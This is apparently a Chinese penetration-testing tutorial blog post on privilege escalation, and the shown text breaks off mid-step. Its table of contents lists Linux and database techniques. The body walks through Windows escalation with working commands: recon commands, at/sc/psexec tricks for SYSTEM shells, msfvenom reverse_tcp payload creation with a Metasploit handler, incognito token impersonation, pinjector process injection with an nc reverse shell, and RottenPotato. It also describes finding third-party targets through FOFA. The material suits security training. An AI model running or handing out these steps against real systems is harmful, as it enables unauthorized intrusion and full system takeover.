class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.4.</span> <span class="toc-text">内核漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell%E6%9D%83%E9%99%90%E4%B8%8E%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.5.</span> <span class="toc-text">webshell权限与脏牛提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%8C%83%E5%9B%B4"><span class="toc-number">3.2.5.1.</span> <span class="toc-text">漏洞范围：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">3.2.5.2.</span> <span class="toc-text">危害：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90"><span class="toc-number">3.2.5.3.</span> <span class="toc-text">简要分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B-4"><span class="toc-number">3.2.5.4.</span> <span class="toc-text">流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83%E9%85%8D%E5%90%88suid"><span class="toc-number">3.2.6.</span> <span class="toc-text">环境变量提权（配合SUID）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">3.2.6.1.</span> <span class="toc-text">背景知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-number">3.2.6.2.</span> <span class="toc-text">操作</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-crontab"><span class="toc-number">3.2.7.</span> <span class="toc-text">计划任务 crontab</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84or%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98"><span class="toc-number">3.2.7.1.</span> <span class="toc-text">路径or权限问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E9%97%AE%E9%A2%98"><span class="toc-number">3.2.7.2.</span> <span class="toc-text">命令问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1linux%E6%8F%90%E6%9D%83%E6%95%B0%E6%8D%AE%E5%BA%93mysql_udf"><span class="toc-number">3.2.8.</span> <span class="toc-text">第三方服务——Linux提权数据库MySQL_UDF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-%E6%8F%90%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE%E5%85%B3%E6%B3%A8%E7%82%B9-%E6%8B%93%E5%B1%95%E6%80%BB%E7%BB%93"><span class="toc-number">3.2.9.</span> <span class="toc-text">Linux 提权提升漏洞查找关注点-拓展总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.</span> <span class="toc-text">数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AB%AF%E5%8F%A3%E5%8F%B7"><span class="toc-number">3.3.1.</span> <span class="toc-text">数据库端口号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysqludfmof%E5%90%AF%E5%8A%A8%E9%A1%B9%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.3.2.</span> <span class="toc-text">Mysql（UDF&#x2F;MOF&#x2F;启动项&#x2F;反弹shell）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">文件存储方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#udf"><span class="toc-number">3.3.2.2.</span> <span class="toc-text">UDF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mof"><span class="toc-number">3.3.2.3.</span> <span class="toc-text">MOF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.2.4.</span> <span class="toc-text">启动项提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.3.2.5.</span> <span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mssql"><span class="toc-number">3.3.3.</span> <span class="toc-text">MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xp_cmdshell"><span class="toc-number">3.3.3.1.</span> <span class="toc-text">xp_cmdshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sp_oacreate-%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.3.2.</span> <span class="toc-text">sp_oacreate 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.3.3.</span> <span class="toc-text">沙盒提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oracle"><span class="toc-number">3.3.4.</span> <span class="toc-text">ORACLE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#oracle%E5%B7%A5%E5%85%B7%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.4.1.</span> <span class="toc-text">Oracle工具提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis"><span class="toc-number">3.3.5.</span> <span class="toc-text">Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.3.5.1.</span> <span class="toc-text">计划任务反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5ssh-keygen"><span class="toc-number">3.3.5.2.</span> <span class="toc-text">写入ssh-keygen</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">3.3.5.3.</span> <span class="toc-text">主从复制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%8E%E6%9D%83%E9%99%90%E5%86%99%E5%85%A5webshell"><span class="toc-number">3.3.5.4.</span> <span class="toc-text">低权限写入webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">3.3.5.5.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#postgresql"><span class="toc-number">3.3.6.</span> <span class="toc-text">PostgreSql</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2018-1058"><span class="toc-number">3.3.6.1.</span> <span class="toc-text">CVE-2018-1058</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2019-9193"><span class="toc-number">3.3.6.2.</span> <span class="toc-text">CVE-2019-9193</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%B5%84%E6%BA%90"><span class="toc-number">4.</span> <span class="toc-text">其他资源</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%B3%A8%E6%84%8F"><span class="toc-number">4.1.</span> <span class="toc-text">复现注意</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E9%A9%AC%E7%BC%96%E5%86%99"><span class="toc-number">4.2.</span> <span class="toc-text">大马编写</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE"><span class="toc-number">5.</span> <span class="toc-text">思维导图</span></a></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-权限提升" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">权限提升</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check">创建于</i> <a href="/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="article-date"><time datetime="2023-06-14T02:42:23.000Z" itemprop="datePublished">2023-06-14</time> </a></span><span class="article-updated"><i class="icon icon-calendar-check">更新于</i> <a href="/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="article-updated"><time datetime="2023-06-27T02:42:23.000Z" itemprop="datePublished">2023-06-27</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/">渗透测试基础</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="leancloud_visitors" data-flag-title="权限提升"><span class="leancloud-visitors-count">0</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/#comments" class="article-comment-link">评论</a></span> <span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 10.8k(字)</span> <span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 43(分)</span></div></div><div class="article-entry marked-body" itemprop="articleBody"><h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>一般渗透流程就是获取webshell权限、获取其他应用权限，然后提权获取服务器系统管理员权限，获取system/root权限。这里主要是思路的体现。</p><h2 id="相关注意点"><a class="markdownIt-Anchor" href="#相关注意点"></a> 相关注意点</h2><ol><li>前期-中期-后期对应知识关系</li><li>知识点顺序，理解思路，分类介绍等</li><li>注重理解当前权限对应可操作的事情</li><li>相关的操作被拒绝无法实现的时候就会涉及到权限提升</li></ol><h2 id="权限分类"><a class="markdownIt-Anchor" href="#权限分类"></a> 权限分类</h2><p><strong>后台权限</strong></p><ol><li>获得方式：<strong>爆破，注入猜解，弱口令</strong>等获取的帐号密码配合登录</li><li>一般网站或应用后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件的。（如后台功能存在文件操作的话也可以操作文件数据）</li></ol><p><strong>网站权限</strong></p><ol><li>获得方式：<strong>爆破，注入猜解，弱口令</strong>等获取的帐号密码配合登录</li><li>查看或修改程序源代码，可以进行网站或应用的配置文件读取（<strong>接口配置信息，数据库配置信息等</strong>），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</li></ol><p><strong>数据库权限</strong></p><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。</p><p><strong>接口权限</strong></p><p>邮件，短信，支付，第三方登录等，一旦截获，我们就可以利用这个接口对他人进行攻击。</p><p><strong>系统权限</strong></p><p><strong>域控权限</strong></p><blockquote><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p></blockquote><h1 id="webshell"><a class="markdownIt-Anchor" href="#webshell"></a> Webshell</h1><h2 id="获得权限的思路"><a class="markdownIt-Anchor" href="#获得权限的思路"></a> 获得权限的思路</h2><ol><li>寻找网站特征，判断cms，查找历史漏洞</li><li>若判断不了，搜集信息，搜集配置文件与源码，审计功能点</li><li>查找功能点，看有没有getshell的可能<ol><li>上传</li><li>sql注入</li><li>RCE等等</li></ol></li></ol><h2 id="某挂壁程序后台权限提升-后台功能"><a class="markdownIt-Anchor" href="#某挂壁程序后台权限提升-后台功能"></a> 某挂壁程序后台权限提升-后台功能</h2><ul><li><strong>前提：已经获取了后台账号密码</strong>（获得方式：爆破，注入猜解，弱口令等获取的帐号密码配合登录 ）</li></ul><p>后台权限和网站权限不同，后台权限不能对网站代码的层次进行修改</p><p>分析网站的CMS，</p><ul><li><p><strong>已知cms</strong></p><ol><li>在网上搜索CMS对应的漏洞，尝试复现。</li><li>网上未能找到相应版本漏洞，下载网站源码，进行代码审计，进行分析，寻找可以提权的漏洞</li><li>用功能点配合网站源码进行测试，在上传点抓包找到对应的代码</li></ol></li><li><p><strong>未知cms</strong></p><p>没有代码：直接常规测试，测试围绕文件上传、模板修改、SQL执行、数据备份等功能</p></li></ul><h2 id="某-bc-广告导航页权限提升-漏洞层面"><a class="markdownIt-Anchor" href="#某-bc-广告导航页权限提升-漏洞层面"></a> 某 BC 广告导航页权限提升-漏洞层面</h2><p>信息收集，发现中间件有漏洞</p><p>抓包了解网站使用的Apache和OpenSSL版本，凭借经验发现是基于PHPstudy的网站。根据网络资料<strong>复现PHPstudy的后门漏洞</strong>，实现命令执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache 2.4.** Mysql 5.*** PHP 5.***</span><br></pre></td></tr></table></figure><h2 id="glassfish-中间件-第三方"><a class="markdownIt-Anchor" href="#glassfish-中间件-第三方"></a> GlassFish 中间件-第三方</h2><p>通过FOFA信息收集，搜索使用GlassFish的网站作为目标根据网络资料复现GlassFish的任意文件读取漏洞（注意使用条件是否匹配）获取敏感信息，进行下一步渗透</p><h1 id="服务器权限"><a class="markdownIt-Anchor" href="#服务器权限"></a> 服务器权限</h1><h2 id="win提权"><a class="markdownIt-Anchor" href="#win提权"></a> WIN提权</h2><h3 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h3><h4 id="权限划分"><a class="markdownIt-Anchor" href="#权限划分"></a> 权限划分</h4><p><strong>普通权限</strong></p><p>一般系统分为七个组，每个组有对应不同的操作权限。<strong>管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、身份验证用户组(Ahthenticated users)、来宾用户组(Guests)</strong>、<em>文件复制组(Replicator)、备份操作组(Backup Operators)</em></p><ul><li>管理员组拥有大部分的计算机操作权限(并不是全部)，能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限）</li><li>来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。</li><li>身份验证用户组(Ahthenticated users) 经过ms验证程序登录的用户均属于此组。</li></ul><p><strong>特殊权限</strong></p><p>出了上述，还有系统的特殊成员：<strong>SYSTEM(系统)、Trustedinstaller（信任程序模块）、Everyone(所有人)、CREATOR OWNER(创建者)</strong> 。这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。</p><ul><li>真正拥有“完全访问权”的只有一个成员:SYSTEM</li></ul><h4 id="基础命令"><a class="markdownIt-Anchor" href="#基础命令"></a> 基础命令</h4><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>systeminfo</code></td><td>打印系统信息</td></tr><tr><td><code>whoami</code></td><td>获得当前用户名</td></tr><tr><td><code>whoami /priv</code></td><td>当前账户权限</td></tr><tr><td><code>ipconfig</code></td><td>网络配置信息</td></tr><tr><td><code>ipconfig /displaydns</code></td><td>显示DNS缓存</td></tr><tr><td><code>route print</code></td><td>打印出路由表</td></tr><tr><td><code>arp -a</code></td><td>打印arp表</td></tr><tr><td><code>hostname</code></td><td>主机名</td></tr><tr><td><code>net user</code></td><td>列出用户</td></tr><tr><td><code>net user &lt;UserName&gt;</code></td><td>关于用户的信息</td></tr><tr><td><code>net use \SMBPATHPa$$w0rd/u:UserName</code></td><td>连接SMB</td></tr><tr><td><code>net localgroup</code></td><td>列出所有组</td></tr><tr><td><code>net localgroup GROUP</code></td><td>关于指定组的信息</td></tr><tr><td><code>net view\127.0.0.1</code></td><td>会话打开到当前计算机</td></tr><tr><td><code>net session</code></td><td>开放给其他机器</td></tr><tr><td><code>netsh firewall show config</code></td><td>显示防火墙配置</td></tr><tr><td><code>DRIVERQUERY</code></td><td>列出安装的驱动</td></tr><tr><td><code>Tasklist /svc</code></td><td>列出服务任务</td></tr><tr><td><code>net start</code></td><td>列出启动的服务</td></tr><tr><td><code>dir/s foo</code></td><td>在目录中搜索指定字符的项</td></tr><tr><td><code>dir/s too==bar</code></td><td>同上</td></tr><tr><td><code>sc query</code></td><td>列出所有服务</td></tr><tr><td><code>sc qc ServiceName</code></td><td>找到指定服务的路径</td></tr><tr><td><code>shutdown /r/t 0</code></td><td>立即重启</td></tr><tr><td><code>type file.txt</code></td><td>打印出内容</td></tr><tr><td><code>Icacls “C:\Example”</code></td><td>列出权限</td></tr><tr><td><code>wmic qfe getCaption, Description,HotFixID,InstalledOn</code></td><td>列出已安装的补丁</td></tr><tr><td><code>(NewObject System.Net.WebClient).DownloadFile( “https://host/file&quot;/&quot;C:\LocalPath&quot;)</code></td><td>利用ps远程下载文件到本地</td></tr><tr><td><code>accesschk. exe-qwsu&quot;Group&quot;</code></td><td>修改对象(尝试Everyone，Authenticated Users和/或users)</td></tr></tbody></table><h3 id="web-shell提权思路"><a class="markdownIt-Anchor" href="#web-shell提权思路"></a> WEB-shell提权思路</h3><ol><li><p>前提是获得web权限</p></li><li><p>判断是什么系统，是服务器（2012 2003等等）还是个人主机（xp win7/10），判断当前权限</p><p>一般使用<code>systeminfo</code>（打了啥补丁）、<code>whoami /priv</code>（能做啥操作）</p></li><li><p>判断是否存在补丁，验证未打的补丁是否有的是<strong>权限提升</strong>/bypass的。</p><p>使用脚本：<a target="_blank" rel="noopener" href="https://github.com/zhzyker/vulmap">Vulmap</a>、<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">Wes</a>、<a target="_blank" rel="noopener" href="https://github.com/chroblert/WindowsVulnScan">WindowsVulnScan</a>使用KBCollect.ps1</p><p>Wes和WindowsVulnScan是python脚本（自己的环境有就行）</p></li><li><p>辅助工具：</p><ul><li><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></li></ul></li></ol><p>发现exp后，使用msf反弹shell连接即可。以上是web上的提权方法。如果看到的补丁是主机层面的提权，则需要以下思路。</p><p>至于为什么会有两种方法？例如本地提权，如果使用的是新建窗口进行提权的，那么在web并不适用，因为没办法连接到新的cmd。</p><h3 id="本地提权思路溢出漏洞atscps"><a class="markdownIt-Anchor" href="#本地提权思路溢出漏洞atscps"></a> 本地提权思路——溢出漏洞/AT/SC/PS</h3><p>溢出漏洞的使用，msf已经足够了解了。有些漏洞可能只适应于本地环境提权，不适用于web环境提权。有些提权方法借助系统上的设计，逻辑上的问题来实现，并不总是依靠漏洞。</p><p>前提已经获得计算机的普通用户权限，较老的计算机系统，视频以Win2003为例，参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/121535553">windows权限提升——AT、SC、PS命令提权</a></p><h4 id="at"><a class="markdownIt-Anchor" href="#at"></a> AT</h4><p><strong>适用范围：只针对Win7及之前的系统，从Win8开始不再支持at命令。</strong></p><p>打开cmd添加一项计划任务，在15:13打开一个cmd窗口，发现打开的窗口是system权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 15:13 /interactive cmd.exe	</span><br></pre></td></tr></table></figure><p>这是一个设计上的逻辑错误。<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45677145/article/details/122061271?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_default&amp;utm_relevant_index=2">Windows中使用命令创建计划任务（at、schtasks）</a></p><h4 id="sc"><a class="markdownIt-Anchor" href="#sc"></a> SC</h4><p><strong>适用范围：03/08、12/16</strong></p><p>创建一个名叫“syscmd”的服务，运行它，发现得到的cmd窗口是system权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br><span class="line">sc start syscmd</span><br></pre></td></tr></table></figure><h4 id="ps"><a class="markdownIt-Anchor" href="#ps"></a> PS</h4><p><strong>适用范围：适用于Win2003 &amp; Win2008</strong></p><p>下载微软官方的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">PsTools</a>工具包，在下载的文件夹下执行下面的命令，发现得到的cmd窗口是system权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula -s -i -d cmd.exe</span><br></pre></td></tr></table></figure><h3 id="令牌窃取及权限提升老"><a class="markdownIt-Anchor" href="#令牌窃取及权限提升老"></a> 令牌窃取及权限提升「老」</h3><p>主要发生在：windows2008 win7左右的系统，才能使用，现在应该就很少了。因为普通用户没办法通过令牌枚举来发现system或者administrator的令牌。所以没办法进行窃取。要发现这些令牌，可以使用烂土豆进行令牌模拟，这样就可以使用令牌窃取了。</p><p>一般都使用MSF进行令牌窃取，流程：</p><ol><li><p>在本地msf服务器上，执行以下命令，生成反弹shell木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=??? -f exe -o /root/xx.exe</span><br></pre></td></tr></table></figure></li><li><p>在本地msf服务器上执行以下命令，监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 6677</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>将该木马xx.exe，上传到远程目标服务器，并运行木马程序。</p></li><li><p>本地监听到会话，查看权限为普通用户xiaodi</p></li><li><p>提权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230621163747422.png" alt="image-20230621163747422"></p></li></ol><h3 id="进程注入dll劫持老"><a class="markdownIt-Anchor" href="#进程注入dll劫持老"></a> 进程注入（DLL劫持）「老」</h3><p>Windows2003&amp;10 进程注入提升 进程注入提权是本地提权方式的一种较为老的安全技术了，<strong>利用的是注入进程的所有者实现权限共享机制</strong>，这类技术主要利用在 windows2008 之前操作系统上，所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统，因为是系统特性，所以不会被杀软拦截。</p><p><strong>pinjector 进程注入工具针对-win2008 以前操作系统</strong></p><ol><li><p>上传到目标机器</p></li><li><p>运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pinjector.exe 　　　　　　//运行命令，查看用法</span><br><span class="line">pinjector.exe -l  //列出可注入的进程</span><br><span class="line">pinjector.exe -p 416 cmd.exe 6688 // pinjector.exe -p pid cmd.exe 6688　注入到系统正常的服务里，监听6688端口（后面是否为system权限）</span><br><span class="line">nc 192.168.131.111 6688 // 监听6688端口，成功反弹shell，成功提权</span><br></pre></td></tr></table></figure></li></ol><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101836817.png" alt="image-20230625101836817" style="zoom:50%"><p>绑定：通过使用命令将权限绑定至system权限的进程中，这里选在进程最好绑定系统进程，这样能够实现开机自启。</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101908888.png" alt="image-20230625101908888" style="zoom:50%"><blockquote><p>其原理是：查看这个软件运行了什么dll，我们就替换这个dll，当程序启动的时候，就会自动调用这个dll达到提权（如果这个软件的运行权限是system）</p></blockquote><h3 id="烂土豆ms16-075配合令牌窃取提权"><a class="markdownIt-Anchor" href="#烂土豆ms16-075配合令牌窃取提权"></a> 烂土豆MS16-075配合令牌窃取提权</h3><p>单纯令牌窃取：适用于web权限或本地提权，如配合烂土豆提权：适用于web或数据库等权限，因为这些权限才有模拟令牌的权限。</p><p>如果可以模拟令牌就可以枚举诸如system的令牌，就可以使用令牌窃取达成权限提升。</p><h4 id="rottenpotato原理"><a class="markdownIt-Anchor" href="#rottenpotato原理"></a> RottenPotato原理</h4><p>RottenPotato（烂土豆）提权的<strong>原理</strong>可以简述如下：</p><ol><li>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</li><li>对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</li><li>模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</li></ol><p>所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。即<strong>非服务类用户权限无法窃取成功。</strong></p><p>具体权限（<code>whoami /priv</code>）/要求为：</p><ol><li>需要支持SeImpersonate或者SeAssignPrimaryToken权限（用来模拟令牌）</li><li>注意RPC端口</li><li><a target="_blank" rel="noopener" href="http://xn--49sq66hcqa154b.NET">需要安装.NET</a> Framework</li></ol><p>烂土豆比热土豆的优点是：</p><ol><li>100%可靠</li><li>（当时）全版本通杀。</li><li>立即生效，不用像hot potato那样有时候需要等<strong>Windows更新</strong>才能使用。</li></ol><p>总之，我对这个的理解是通过中间人攻击，将COM（NT\SYSTEM权限）在第二步挑战应答过程中认证的区块改成自己的区块获取SYSTEM令牌，然后利用msf的模仿令牌功能模仿SYSTEM令牌。</p><p>烂土豆下载资源</p><p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">windows-kernel-exploits/MS16-075 at master · SecWiki/windows-kernel-exploits (github.com)</a></p><p><a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato">foxglovesec/RottenPotato: RottenPotato local privilege escalation from service account to SYSTEM (github.com)</a></p><h4 id="烂土豆提权流程"><a class="markdownIt-Anchor" href="#烂土豆提权流程"></a> 烂土豆提权流程</h4><p><strong>上传烂土豆----------&gt;执行烂土豆----------&gt;利用窃取模块----------&gt;窃取SYSTEM----------&gt;成功</strong></p><ol><li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tianlinlin/p/10171981.html">上传后门</a>，生成一个后门，并上传到目标服务器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure></li><li><p>启动监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 5577</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>受害机执行后门</p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230621171531434.png" alt="image-20230621171531434"></p><p>确定当前为webshell权限。<code>getuid</code></p></li><li><p>单纯令牌窃取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure><p>提权失败，单纯用令牌窃取提权需要有一定的权限，这里的权限太低。</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625094704731.png" alt="image-20230625094704731" style="zoom:50%"></li><li><p>借助烂土豆提权</p><ol><li><p>上传potato.exe</p></li><li><p>在刚才的test的基础之上，再执行potato.exe</p><img 